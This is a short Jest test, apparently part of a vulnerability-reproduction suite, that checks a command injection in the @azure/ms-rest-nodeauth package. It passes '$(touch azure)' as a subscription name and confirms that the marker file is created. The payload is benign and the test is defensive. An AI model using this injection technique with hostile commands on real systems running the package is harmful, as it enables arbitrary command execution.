//https://snyk.io/vuln/SNYK-JS-AZUREMSRESTNODEAUTH-1245464
test("Command Injection in @azure/ms-rest-nodeauth", () => {
  const auth = require("@azure/ms-rest-nodeauth");
  const fs = require("fs");
  const path = "./azure";
  const sleep = require("sleep");

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  auth.AzureCliCredentials.setDefaultSubscription(
    "$(touch azure)"
  ).catch(() => {});

  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, () => {}); //deleting the file after creation
});
//has some errors along with correct output
